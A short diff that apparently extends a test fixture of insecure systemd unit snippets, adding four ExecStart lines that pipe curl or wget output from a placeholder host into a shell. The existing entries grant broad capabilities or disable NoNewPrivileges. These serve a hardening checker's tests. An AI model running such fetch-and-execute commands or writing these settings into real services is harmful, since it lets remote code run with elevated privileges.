@@ -55,5 +55,9 @@
  "[Service]\nNoNewPrivileges=no\n",
  "[Service]\nCapabilityBoundingSet=CAP_SYS_ADMIN\n",
  "[Service]\nAmbientCapabilities=~CAP_NET_RAW\n",
- "[Service]\nAmbientCapabilities=CAP_SYS_PTRACE CAP_DAC_OVERRIDE CAP_ALL\n"
+ "[Service]\nAmbientCapabilities=CAP_SYS_PTRACE CAP_DAC_OVERRIDE CAP_ALL\n",
+ "[Service]\nExecStart=/bin/sh -c 'curl -fsSL https://x | /bin/bash'\n",
+ "[Service]\nExecStart=/bin/sh -c 'curl x | sudo -u app /bin/sh'\n",
+ "[Service]\nExecStart=/bin/sh -c 'wget -qO- x | /usr/bin/env bash'\n",
+ "[Service]\nExecStart=/bin/sh -c 'curl x | tee /var/log/sh'\n"
 ]
